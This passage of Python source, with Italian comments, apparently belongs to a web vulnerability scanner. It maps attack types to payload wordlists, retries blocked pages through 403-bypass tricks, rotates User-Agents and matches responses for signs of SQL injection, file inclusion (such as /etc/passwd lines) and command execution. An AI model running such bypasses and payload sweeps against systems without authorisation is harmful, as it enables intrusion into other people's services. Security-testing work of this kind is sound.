                    'attack/path-traversal/traversals-8-deep-exotic-encoding.txt'
                ],
                'seclists': [
                    'Fuzzing/LFI/LFI-gracefulsecurity-linux.txt'
                ]
            },
            'auth_bypass': {
                'seclists': [
                    'Fuzzing/Auth-Bypass.txt'
                ],
                'payloads': [
                    'SQL Injection/Intruder/Auth_Bypass.txt'
                ]
            },
            'css_injection': {
                'payloads': [
                    'XSS Injection/Intruders/CSS-Injection.txt'
                ]
            },
            'nosqli': {
                'fuzzdb': [
                    'attack/no-sql-injection/mongodb.txt'
                ],
                'payloads': [
                    'NoSQL Injection/Intruder/MongoDB.txt',
                    'NoSQL Injection/Intruder/NoSQL.txt'
                ],
                'seclists': [
                    'Fuzzing/Databases/NoSQL.txt'
                ]
            },
            'crlf': {
                'fuzzdb': [
                    'attack/http-protocol/crlf-injection.txt'
                ],
                'payloads': [
                    'CRLF Injection/Files/crlfinjection.txt'
                ]
            },
            'cors': {
                'payloads': [
                    'CORS Misconfiguration/README.md'
                ]
            },
            'csv_injection': {
                'payloads': [
                    'CSV Injection/README.md'
                ]
            },
            'deserialization': {
                'payloads': [
                    'Insecure Deserialization/Files/',
                    'Insecure Deserialization/PHP.md',
                    'Insecure Deserialization/Java.md',
                    'Insecure Deserialization/Python.md'
                ]
            },
            'graphql': {
                'payloads': [
                    'GraphQL Injection/README.md'
                ]
            },
            'smuggling': {
                'payloads': [
                    'Request Smuggling/README.md'
                ]
            },
            'race_condition': {
                'payloads': [
                    'Race Condition/README.md'
                ]
            },
            'saml': {
                'payloads': [
                    'SAML Injection/README.md'
                ]
            },
            'ssi': {
                'fuzzdb': [
                    'attack/server-side-include/server-side-includes-generic.txt'
                ],
                'payloads': [
                    'Server Side Include Injection/Files/ssi_esi.txt'
                ],
                'seclists': [
                    'Fuzzing/SSI-Injection-Jhaddix.txt'
                ]
            },
            'xpath': {
                'fuzzdb': [
                    'attack/xpath/xpath-injection.txt'
                ],
                'payloads': [
                    'XPATH Injection/README.md'
                ]
            },
            'xslt': {
                'payloads': [
                    'XSLT Injection/Files/'
                ]
            },
            'cache_deception': {
                'payloads': [
                    'Web Cache Deception/README.md'
                ]
            },
            'websocket': {
                'payloads': [
                    'Web Sockets/Files/ws-harness.py'
                ]
            },
            'jwt': {
                'payloads': [
                    'JSON Web Token/README.md'
                ]
            },
            'prototype_pollution': {
                'payloads': [
                    'Prototype Pollution/README.md'
                ]
            },
            'dom_clobbering': {
                'payloads': [
                    'DOM Clobbering/README.md'
                ]
            },
            'mass_assignment': {
                'payloads': [
                    'Mass Assignment/README.md'
                ]
            },
            'type_juggling': {
                'payloads': [
                    'Type Juggling/README.md'
                ]
            },
            'latex': {
                'payloads': [
                    'LaTeX Injection/README.md'
                ]
            },
            'oauth': {
                'payloads': [
                    'OAuth Misconfiguration/README.md'
                ]
            },
            'orm': {
                'payloads': [
                    'ORM Leak/README.md'
                ]
            },
            'prompt_injection': {
                'payloads': [
                    'Prompt Injection/README.md'
                ]
            },
            'regex': {
                'payloads': [
                    'Regular Expression/README.md'
                ]
            },
            'hpp': {
                'fuzzdb': [
                    'attack/http-protocol/hpp.txt'
                ],
                'payloads': [
                    'HTTP Parameter Pollution/README.md'
                ]
            },
            'tabnabbing': {
                'payloads': [
                    'Tabnabbing/README.md'
                ]
            },
            'zip_slip': {
                'payloads': [
                    'Zip Slip/README.md'
                ]
            },
            'unicode': {
                'fuzzdb': [
                    'attack/unicode/'
                ],
                'seclists': [
                    'Fuzzing/Unicode.txt'
                ]
            },
            'format_string': {
                'fuzzdb': [
                    'attack/format-strings/format-strings.txt'
                ],
                'seclists': [
                    'Fuzzing/FormatString-Jhaddix.txt'
                ]
            },
            'integer_overflow': {
                'fuzzdb': [
                    'attack/integer-overflow/integer-overflows.txt'
                ]
            },
            'control_chars': {
                'fuzzdb': [
                    'attack/control-chars/'
                ],
                'seclists': [
                    'Fuzzing/special-chars.txt'
                ]
            },
            'business_logic': {
                'fuzzdb': [
                    'attack/business-logic/'
                ],
                'payloads': [
                    'Business Logic Errors/README.md'
                ]
            },
            'json': {
                'fuzzdb': [
                    'attack/json/JSON_Fuzzing.txt'
                ],
                'seclists': [
                    'Fuzzing/JSON.Fuzzing.txt'
                ]
            },
            'polyglot': {
                'seclists': [
                    'Fuzzing/Polyglots/SQLi-Polyglots.txt',
                    'Fuzzing/Polyglots/XSS-Polyglots.txt',
                    'Fuzzing/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt'
                ]
            },
            'dos': {
                'payloads': [
                    'Denial of Service/README.md'
                ]
            },
            'dns': {
                'payloads': [
                    'DNS Rebinding/README.md'
                ]
            },
            'hidden_params': {
                'payloads': [
                    'Hidden Parameters/README.md'
                ]
            },
            'iosec': {
                'payloads': [
                    'Insecure Direct Object References/README.md'
                ]
            }
        }
    
    def get_wordlists_for_vulnerability(self, vuln_type, technology=None):
        """Get appropriate wordlists for a vulnerability type"""
        wordlists = []

        if vuln_type not in self.wordlist_map:
            return wordlists

        vuln_lists = self.wordlist_map[vuln_type]

        # Build full paths
        for source, paths in vuln_lists.items():
            if source in self.base_paths:
                for path in paths:
                    full_path = f"{self.base_paths[source]}/{path}"
                    wordlists.append({
                        'source': source,
                        'path': full_path,
                        'relative_path': path
                    })

        return wordlists

    def get_internal_payloads(self, vuln_type):
        """
        Get internal fallback payloads for a vulnerability type.
        Usato quando i wordlist esterni non sono disponibili.
        """
        vuln_type_lower = vuln_type.lower()
        return self.INTERNAL_PAYLOADS.get(vuln_type_lower, [])


class DiscoveryWordlistMapper:
    """Map detected technologies to appropriate discovery wordlists"""
    
    def __init__(self, base_paths):
        self.base_paths = base_paths
        self.discovery_map = {
            'generic': [
                'SecLists/Discovery/Web-Content/common.txt',
                'SecLists/Discovery/Web-Content/quickhits.txt',
                'SecLists/Discovery/Web-Content/raft-small-directories.txt',
                'SecLists/Discovery/Web-Content/raft-small-files.txt'
            ],
            'wordpress': [
                'SecLists/Discovery/Web-Content/CMS/wordpress.txt',
                'SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt'
            ],
            'drupal': [
                'SecLists/Discovery/Web-Content/CMS/Drupal.txt'
            ],
            'joomla': [
                'SecLists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt'
            ],
            'php': [
                'SecLists/Discovery/Web-Content/PHP.fuzz.txt',
                'SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt'
            ],
            'asp.net': [
                'SecLists/Discovery/Web-Content/IIS.fuzz.txt'
            ],
            'java': [
                'SecLists/Discovery/Web-Content/tomcat.txt'
            ],
            'python': [
                'SecLists/Discovery/Web-Content/django.txt'
            ],
            'api': [
                'SecLists/Discovery/Web-Content/api/api-endpoints.txt'
            ]
        }
    
    def get_wordlists(self, technology):
        """Get wordlists for a specific technology"""
        wordlists = []
        
        if technology in self.discovery_map:
            for wordlist_path in self.discovery_map[technology]:
                # Try each base path
                for base_name, base_path in self.base_paths.items():
                    # Fix case sensitivity for SecLists
                    if base_name == 'seclists':
                        wordlist_path = wordlist_path.replace('SecLists/', '')
                    
                    full_path = os.path.join(base_path, wordlist_path)
                    if os.path.exists(full_path):
                        wordlists.append({
                            'path': full_path,
                            'source': base_name,
                            'technology': technology
                        })
                        break
        
        return wordlists


class BypassManager:
    """Manage and apply bypasses from application_traceroute with technology stack"""
    
    def __init__(self, bypass_file=None):
        self.bypasses = []
        self.validated_bypasses = []
        self.technology_stack = {}
        self.infrastructure = {}
        
        if bypass_file:
            self.load_bypasses_from_json(bypass_file)
    
    def load_bypasses_from_json(self, filename):
        """Load bypasses from application_traceroute JSON output"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            # Extract technology stack (NEW FORMAT)
            self.technology_stack = data.get('technology_stack', {})
            
            # Extract infrastructure details
            self.infrastructure = {
                'chain': data.get('infrastructure_chain', []),
                'fingerprints': data.get('infrastructure_fingerprints', {}),
                'discrepancies': data.get('discrepancies_found', [])
            }
            
            self.bypasses = data.get('bypasses', [])
            
            # Filter only validated bypasses
            self.validated_bypasses = [
                bypass for bypass in self.bypasses 
                if bypass.get('validated', False)
            ]
            
            logger.info(f"Loaded technology stack: {self.technology_stack}")
            logger.info(f"Loaded infrastructure: {self.infrastructure['chain']}")
            logger.info(f"Loaded {len(self.bypasses)} total bypasses, {len(self.validated_bypasses)} validated")
            
            if self.validated_bypasses:
                for bypass in self.validated_bypasses:
                    logger.info(f"  ✅ {bypass['type']}: {bypass['description']}")
            else:
                logger.warning("No validated bypasses found in file")
                
        except Exception as e:
            logger.error(f"Failed to load bypasses from {filename}: {e}")
    
    def apply_bypass_to_request(self, url, bypass, payload="", method="GET"):
        """Apply a specific bypass to a request"""
        try:
            parsed = urlparse(url)
            
            # Build request parameters
            request_params = {
                'url': url,
                'method': method,
                'timeout': 10,
                'verify': False,
                'allow_redirects': True
            }
            
            # Apply bypass based on type
            if bypass['type'] == 'Unicode Bypass':
                # Unicode path bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    if payload:
                        if '?' in request_params['url']:
                            request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif bypass['type'] == 'Encoding Bypass':
                # Base64 or other encoding bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    if bypass_path.startswith('/?path='):
                        if payload:
                            encoded_payload = base64.b64encode(payload.encode()).decode()
                            request_params['url'] = f"{parsed.scheme}://{parsed.netloc}/?path={encoded_payload}"
                        else:
                            request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    else:
                        request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                        if payload:
                            if '?' in request_params['url']:
                                request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                            else:
                                request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif bypass['type'] == 'Path Bypass':
                # Path traversal bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    if payload:
                        if '?' in request_params['url']:
                            request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif 'Buffer Overflow Bypass' in bypass['type']:
                # Buffer overflow bypass with large headers
                if 'headers' in bypass['curl_data']:
                    request_params['headers'] = bypass['curl_data']['headers'].copy()
                    if payload:
                        if '?' in url:
                            request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
            
            else:
                # Generic bypass - just add payload to URL
                if payload:
                    if '?' in url:
                        request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                    else:
                        request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
            
            return request_params
            
        except Exception as e:
            logger.error(f"Error applying bypass {bypass['type']}: {e}")
            return None


class SmartCrawler:
    """Advanced web crawler with JS analysis and smart endpoint discovery"""
    
    def __init__(self, target_url, max_depth=3, max_pages=1000, verbose=False, auth_config=None, debug_mode=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.verbose = verbose
        self.debug_mode = debug_mode
        self.visited_urls = set()

        # Initialize vulnerability logger FIRST (creates output directory)
        self.vuln_logger = VulnerabilityLogger(target_url)
        self.results_dir = self.vuln_logger.output_dir  # Store for other outputs
        print(f"  📁 Results directory: {self.results_dir}")

        # Initialize debug logger if debug mode enabled (uses same directory)
        self.debug_logger = None
        if debug_mode and DEBUG_LOGGER_AVAILABLE:
            self.debug_logger = DebugLogger(output_dir=self.results_dir, enabled=True)
            print(f"  🐛 Debug mode enabled - logging to: {self.debug_logger.output_file}")
        elif debug_mode and not DEBUG_LOGGER_AVAILABLE:
            print("  ⚠ Debug mode requested but debug_logger module not available")

        # Initialize vulnerability verifier with learning
        self.vuln_verifier = None
        if VERIFIER_AVAILABLE:
            self.vuln_verifier = VulnerabilityVerifier(enable_learning=True)
            print("  🔬 Vulnerability verifier enabled with auto-learning")
        else:
            print("  ⚠ Vulnerability verifier not available - using basic detection")

        # Sistema di deduplicazione avanzato
        # Traccia parametri testati per evitare test ridondanti su URL diversi
        # Chiave: (param_name, vuln_type) -> valore: set di URL dove è stato testato
        self.tested_params_vulns = {}

        # Backward compatibility (deprecated but kept for now)
        self.tested_dynamic_params = set()
        self.tested_path_segments = set()
        self.tested_query_params = set()
        self.tested_hash_params = set()
        self.tested_form_params = set()

        # Queue con limite per evitare OOM con discovery aggressivo
        self.url_queue = queue.Queue(maxsize=5000)
        self.endpoints = []
        self.forms = []
        # vuln_logger already initialized at top of __init__

        # Inizializza rate limiter e performance monitor
        self.rate_limiter = RateLimiter(requests_per_second=5)
        self.performance_monitor = PerformanceMonitor()

        # Hash set per payload validation (evita test duplicati)
        self.tested_payloads_hash = set()

        # ⚡ REGEX PRECOMPILATE per evitare ricompilazione ripetuta
        self._compile_regex_patterns()

        # Setup session with retry strategy
        base_session = requests.Session()

        # Retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        base_session.mount("http://", adapter)
        base_session.mount("https://", adapter)

        # Wrap with DebugSession if debug mode is enabled
        if self.debug_logger:
            self.session = DebugSession(base_session, self.debug_logger)
        else:
            self.session = base_session

        # Rotating User-Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
        ]
        
        # Set initial headers
        self._rotate_user_agent()
        
        # Initialize components
        self.tech_detector = TechnologyDetector()
        self.param_analyzer = ParameterAnalyzer()
        
        # Set default base paths
        self.default_base_paths = {
            'fuzzdb': '/usr/share/wordlists/fuzzdb',
            'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
            'seclists': '/usr/share/wordlists/SecLists'
        }
        
        self.wordlist_mapper = WordlistMapper(self.default_base_paths)
        self.discovery_mapper = DiscoveryWordlistMapper(self.default_base_paths)
        
        # Initialize behavioral engine
        self.behavioral_engine = BehavioralContextEngine()
        
        # Initialize authentication with debug logger
        self.auth_manager = AuthenticationManager(debug_logger=self.debug_logger)
        if auth_config:
            self.auth_manager.setup_authentication(self.session, auth_config)
        
        # Bypass manager - will be set if bypass file provided
        self.bypass_manager = None
        
        # Results storage
        self.results = {
            'target': target_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'technologies': {},
            'endpoints': [],
            'forms': [],
            'javascript_files': [],
            'api_endpoints': [],
            'interesting_files': [],
            'comments': [],
            'emails': [],
            'potential_vulnerabilities': defaultdict(list),
            'vulnerability_test_results': [],  # Store immediate test results
            'behavioral_analysis_results': []  # Store behavioral analysis results
        }
    
    def set_bypass_manager(self, bypass_manager):
        """Set the bypass manager for the crawler"""
        self.bypass_manager = bypass_manager
        
        # Pass technology stack to behavioral engine
        if bypass_manager and bypass_manager.technology_stack:
            self.behavioral_engine.set_technology_hints(bypass_manager.technology_stack)
            
            # Update results with technology from bypass file
            self.results['technologies'].update({
                'infrastructure': bypass_manager.infrastructure,
                'stack': bypass_manager.technology_stack
            })
        
        if self.verbose and bypass_manager and bypass_manager.validated_bypasses:
            print(f"🔧 Bypass Manager initialized with {len(bypass_manager.validated_bypasses)} validated bypasses")
            print(f"📊 Technology Stack: {bypass_manager.technology_stack}")

    def should_test_parameter(self, param_name, vuln_type, url=None, max_tests_per_param=3):
        """
        Verifica se un parametro dovrebbe essere testato per una specifica vulnerabilità.

        Questo metodo implementa una deduplicazione intelligente che:
        - Evita di testare lo stesso parametro per la stessa vulnerabilità su URL diversi
        - Permette di testare un parametro su un numero limitato di URL diversi
        - Riduce drasticamente il tempo di scansione evitando test ridondanti

        Args:
            param_name: Nome del parametro
            vuln_type: Tipo di vulnerabilità (xss, sqli, lfi, etc.)
            url: URL dove è stato trovato il parametro (opzionale)
            max_tests_per_param: Numero massimo di URL su cui testare lo stesso parametro (default: 3)

        Returns:
            True se il parametro dovrebbe essere testato, False altrimenti
        """
        # Normalizza il tipo di vulnerabilità
        vuln_type = vuln_type.lower().strip()

        # Crea chiave unica per parametro+vulnerabilità
        key = (param_name, vuln_type)

        # Se non è mai stato testato, testalo
        if key not in self.tested_params_vulns:
            return True

        # Se è stato testato ma non abbiamo l'URL, assumiamo che non debba essere ritestato
        if url is None:
            return False

        # Normalizza l'URL (rimuove parametri query e fragment per confronto)
        parsed = urlparse(url)
        normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        tested_urls = self.tested_params_vulns[key]

        # Se è già stato testato su questo URL, skippa
        if normalized_url in tested_urls:
            if self.verbose:
                logger.debug(f"⏭️  Skipping {param_name} ({vuln_type}) - already tested on {normalized_url}")
            return False

        # Se è stato testato su troppi URL diversi, skippa (evita loop)
        if len(tested_urls) >= max_tests_per_param:
            if self.verbose:
                logger.debug(f"⏭️  Skipping {param_name} ({vuln_type}) - already tested on {len(tested_urls)} URLs")
            return False

        return True

    def mark_parameter_tested(self, param_name, vuln_type, url=None):
        """
        Marca un parametro come testato per una specifica vulnerabilità.

        Args:
            param_name: Nome del parametro
            vuln_type: Tipo di vulnerabilità testata
            url: URL dove è stato testato (opzionale)
        """
        vuln_type = vuln_type.lower().strip()
        key = (param_name, vuln_type)

        if key not in self.tested_params_vulns:
            self.tested_params_vulns[key] = set()

        if url:
            parsed = urlparse(url)
            normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            self.tested_params_vulns[key].add(normalized_url)

            if self.verbose:
                logger.debug(f"✅ Marked {param_name} ({vuln_type}) as tested on {normalized_url}")

    def _compile_regex_patterns(self):
        """
        Compila tutte le regex usate frequentemente per evitare ricompilazione.

        Le regex vengono compilate una volta durante __init__ e riutilizzate.
        Migliora performance di ~15-20% in detection methods.
        """
        # Regex per XSS detection
        self.xss_patterns = {
            'script_tag': re.compile(r'<script[^>]*>', re.I),
            'javascript_protocol': re.compile(r'javascript:', re.I),
            'event_handler': re.compile(r'on\w+\s*=', re.I),
            'img_tag': re.compile(r'<img[^>]*>', re.I),
            'svg_tag': re.compile(r'<svg[^>]*>', re.I),
            'iframe_tag': re.compile(r'<iframe[^>]*>', re.I),
            'object_tag': re.compile(r'<object[^>]*>', re.I),
            'embed_tag': re.compile(r'<embed[^>]*>', re.I),
        }

        # Regex per SQL injection detection
        self.sqli_patterns = [
            re.compile(r'SQL syntax.*MySQL', re.I),
            re.compile(r'Warning.*mysql_', re.I),
            re.compile(r'MySQLSyntaxErrorException', re.I),
            re.compile(r'valid MySQL result', re.I),
            re.compile(r'PostgreSQL.*ERROR', re.I),
            re.compile(r'Warning.*\Wpg_', re.I),
            re.compile(r'valid PostgreSQL result', re.I),
            re.compile(r'PSQLException', re.I),
            re.compile(r'Driver.*SQL[\s\-\_]*Server', re.I),
            re.compile(r'OLE DB.*SQL Server', re.I),
            re.compile(r'SQLServer JDBC Driver', re.I),
            re.compile(r'SqlException', re.I),
            re.compile(r'Unclosed quotation mark', re.I),
            re.compile(r'Oracle.*Driver', re.I),
            re.compile(r'Warning.*oci_', re.I),
            re.compile(r'OracleException', re.I),
            re.compile(r'SQLite.*Exception', re.I),
            re.compile(r'System.Data.SQLite.SQLiteException', re.I),
            re.compile(r'Warning.*sqlite_', re.I),
            re.compile(r'SQL\s*command\s*not\s*properly\s*ended', re.I),
            re.compile(r'Query\s*failed', re.I),
            re.compile(r'syntax error at or near', re.I),
            re.compile(r"You have an error in your SQL syntax", re.I),
        ]

        # Regex per LFI detection
        self.lfi_patterns = [
            re.compile(r'root:[\w\*\!]:0:0:', re.I | re.M),
            re.compile(r'daemon:\*:1:1:', re.I | re.M),
            re.compile(r'\[boot\s*loader\]', re.I | re.M),
            re.compile(r'multi\(0\)disk\(0\)', re.I | re.M),
            re.compile(r'allow_url_fopen', re.I),
            re.compile(r'auto_prepend_file', re.I),
            re.compile(r'disable_functions', re.I),
            re.compile(r'DocumentRoot', re.I),
            re.compile(r'ServerRoot', re.I),
            re.compile(r'LoadModule', re.I),
            re.compile(r'Volume\s*Serial\s*Number', re.I | re.M),
            re.compile(r'Directory\s*of\s*[A-Z]:', re.I | re.M),
            re.compile(r'failed to open stream', re.I),
            re.compile(r'Failed opening', re.I),
            re.compile(r'Warning.*include', re.I),
            re.compile(r'Warning.*file_get_contents', re.I),
        ]

        # Regex per RCE detection
        self.rce_patterns = [
            re.compile(r'uid=\d+.*gid=\d+.*groups=', re.I | re.M),
            re.compile(r'Linux\s+\w+\s+\d+\.\d+', re.I | re.M),
            re.compile(r'Microsoft\s+Windows', re.I | re.M),
            re.compile(r'Volume\s+in\s+drive', re.I | re.M),
            re.compile(r'Directory\s+of', re.I | re.M),
            re.compile(r'[\w\-]+@[\w\-]+:', re.I),
            re.compile(r'/bin/\w+', re.I),
            re.compile(r'/usr/bin/\w+', re.I),
            re.compile(r'command not found', re.I),
            re.compile(r'is not recognized as', re.I),
            re.compile(r'PID\s+TTY\s+TIME\s+CMD', re.I | re.M),
        ]

        # Regex per safe context check
        self.safe_context_patterns = {
            'html_comment': re.compile(r'<!--[\s\S]*?-->'),
            'js_line_comment': re.compile(r'//.*$', re.M),
            'js_block_comment': re.compile(r'/\*[\s\S]*?\*/', re.S),
            'cdata': re.compile(r'<!\[CDATA\[[\s\S]*?\]\]>', re.I | re.S),
        }

        logger.debug("✅ Regex patterns compiled successfully")

    def cleanup(self):
        """
        Pulizia risorse prima della chiusura.

        Chiude connessioni HTTP, svuota cache, logga statistiche finali.
        Chiamare questo metodo al termine della scansione per evitare memory leak.
        """
        try:
            # Log statistiche finali
            if hasattr(self, 'performance_monitor'):
                self.performance_monitor.log_stats(prefix="Final Stats")

            # Chiudi sessione HTTP
            if hasattr(self, 'session'):
                self.session.close()
                logger.debug("HTTP session closed")

            # Svuota cache
            if hasattr(self, 'behavioral_engine') and hasattr(self.behavioral_engine, 'cache'):
                self.behavioral_engine.cache.clear()
                logger.debug("Behavioral cache cleared")

            # Svuota results per liberare memoria
            if hasattr(self, 'results'):
                self.results.clear()

            # Svuota queue
            if hasattr(self, 'url_queue'):
                while not self.url_queue.empty():
                    try:
                        self.url_queue.get_nowait()
                    except queue.Empty:
                        break

            logger.info("✅ Cleanup completed successfully")

        except Exception as e:
            logger.error(f"Error during cleanup: {e}", exc_info=True)

    def __del__(self):
        """
        Destructor - chiama cleanup quando oggetto viene distrutto.

        Garantisce che le risorse vengano rilasciate anche se cleanup()
        non viene chiamato esplicitamente.
        """
        try:
            self.cleanup()
        except:
            # Ignora errori nel destructor per evitare problemi durante shutdown
            pass

    def _rotate_user_agent(self):
        """Rotate User-Agent for each request"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def normalize_url(self, url):
        """Normalize URL to avoid duplicates"""
        # Remove fragment
        url = url.split('#')[0]
        # Remove trailing slash
        url = url.rstrip('/')
        # Sort query parameters
        parsed = urlparse(url)
        if parsed.query:
            params = sorted(parse_qs(parsed.query).items())
            query = urllib.parse.urlencode(params, doseq=True)
            url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, query, ''
            ))
        return url
    
    def resolve_initial_redirects(self):
        """Resolve initial redirects to get the actual target URL"""
        try:
            # Follow redirects for the initial URL
            response = self.session.get(self.target_url, timeout=15, verify=False, allow_redirects=True)
            final_url = response.url
            
            if final_url != self.target_url:
                logger.info(f"Target URL redirected: {self.target_url} → {final_url}")
                self.target_url = final_url.rstrip('/')
                self.parsed_url = urlparse(self.target_url)
                
            return True
        except Exception as e:
            logger.error(f"Failed to resolve initial URL: {e}")
            return False
    
    def is_valid_url(self, url):
        """Check if URL should be crawled"""
        parsed = urlparse(url)
        
        # Check if same domain
        if parsed.netloc != self.parsed_url.netloc:
            return False
        
        # Skip certain file types
        skip_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.zip', '.exe']
        if any(url.lower().endswith(ext) for ext in skip_extensions):
            return False
        
        # Skip logout URLs
        if 'logout' in url.lower() or 'signout' in url.lower():
            return False
        
        return True
    
    def extract_urls_from_js(self, js_content, base_url):
        """Extract API endpoints and URLs from JavaScript"""
        urls = set()
        
        # Common API patterns
        api_patterns = [
            r'["\']/(api/[^"\']+)["\']',
            r'["\']/(v\d+/[^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[get|post|put|delete]+\(["\']([^"\']+)["\']',
            r'\.ajax\({[^}]*url:\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest.*open\([^,]+,\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, js_content, re.I)
            for match in matches:
                url = urljoin(base_url, match)
                urls.add(url)
        
        return urls
    
    def crawl_page(self, url, depth=0):
        """Crawl a single page and extract information with extended analysis"""
        if depth > self.max_depth or len(self.visited_urls) >= self.max_pages:
            return
        
        normalized_url = self.normalize_url(url)
        if normalized_url in self.visited_urls:
            return
        
        self.visited_urls.add(normalized_url)
        logger.info(f"Crawling: {url} (depth: {depth})")
        if self.verbose:
            print(f"\n🕷️ Crawling page: {url} (depth: {depth}, visited: {len(self.visited_urls)})")
        
        try:
            # Rotate user agent before each request
            self._rotate_user_agent()
            
            # Make request with dynamic timeout based on depth
            timeout = 15 if depth == 0 else 10
            allow_redirects = (depth == 0)
            
            # Try normal request first
            response = self.session.get(url, timeout=timeout, verify=False, allow_redirects=allow_redirects)
            
            # If blocked (403/401) and we have bypasses, try them
            if response.status_code in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                if self.verbose:
                    print(f"🚫 Access denied ({response.status_code}), trying bypasses...")
                
                for bypass in self.bypass_manager.validated_bypasses:
                    if self.verbose:
                        print(f"  🔧 Trying {bypass['type']}...")
                    
                    bypass_params = self.bypass_manager.apply_bypass_to_request(url, bypass)
                    if bypass_params:
                        try:
                            bypass_response = self.session.get(
                                bypass_params['url'],
                                headers=bypass_params.get('headers'),
                                timeout=timeout,
                                verify=False,
                                allow_redirects=allow_redirects
                            )
                            
                            if bypass_response.status_code not in [401, 403]:
                                if self.verbose:
                                    print(f"    ✅ Bypass successful! Status: {bypass_response.status_code}")
                                response = bypass_response
                                break
                            elif self.verbose:
                                print(f"    ❌ Still blocked: {bypass_response.status_code}")
                        except:
                            continue
            
            response.raise_for_status()
            
            # Detect technologies
            if not self.results['technologies']:
                self.results['technologies'] = self.tech_detector.detect(response, url)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract JavaScript content for analysis
            # ⚡ OTTIMIZZAZIONE: usa list + join invece di concatenazione ripetuta
            js_content_parts = []

            for script in soup.find_all('script'):
                src = script.get('src')
                if src:
                    js_url = urljoin(url, src)
                    self.results['javascript_files'].append(js_url)

                    # Analyze external JS
                    js_response = None
                    try:
                        # ⚡ Rate limiting
                        self.rate_limiter.wait()

                        js_response = self.session.get(js_url, timeout=5)

                        # Incrementa contatore HTTP requests
                        self.performance_monitor.increment_requests()

                        js_content_parts.append(js_response.text)
                        js_urls = self.extract_urls_from_js(js_response.text, url)
                        for js_url_found in js_urls:
                            if self.is_valid_url(js_url_found):
                                self.url_queue.put((js_url_found, depth + 1))
                                if '/api/' in js_url_found or '/v1/' in js_url_found:
                                    self.results['api_endpoints'].append(js_url_found)

                    except requests.Timeout:
                        logger.warning(f"Timeout fetching JS file: {js_url}")
                        self.performance_monitor.increment_errors()
                    except requests.ConnectionError:
                        logger.warning(f"Connection error fetching JS file: {js_url}")
                        self.performance_monitor.increment_errors()
                    except Exception as e:
                        logger.debug(f"Error fetching JS file {js_url}: {e}")
                        self.performance_monitor.increment_errors()
                    finally:
                        # ✅ CLEANUP: chiudi response
                        if js_response is not None:
                            try:
                                js_response.close()
                            except:
                                pass

                # Analyze inline JS
                if script.string:
                    js_content_parts.append(script.string)
                    js_urls = self.extract_urls_from_js(script.string, url)
                    for js_url_found in js_urls:
                        if self.is_valid_url(js_url_found):
                            self.url_queue.put((js_url_found, depth + 1))
                            if '/api/' in js_url_found or '/v1/' in js_url_found:
                                self.results['api_endpoints'].append(js_url_found)

            # ⚡ Crea js_content una volta sola (più efficiente di concatenazione ripetuta)
            js_content = "\n".join(js_content_parts)
            
            # Extract URLs for further crawling
            for tag in soup.find_all(['a', 'link']):
                href = tag.get('href')
                if href:
                    absolute_url = urljoin(url, href)
                    if self.is_valid_url(absolute_url):
                        self.url_queue.put((absolute_url, depth + 1))
            
            # Extract comments
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
            for comment in comments:
                if any(keyword in comment.lower() for keyword in ['todo', 'fixme', 'hack', 'bug', 'debug']):
                    self.results['comments'].append(comment.strip())
            
            # Extract emails
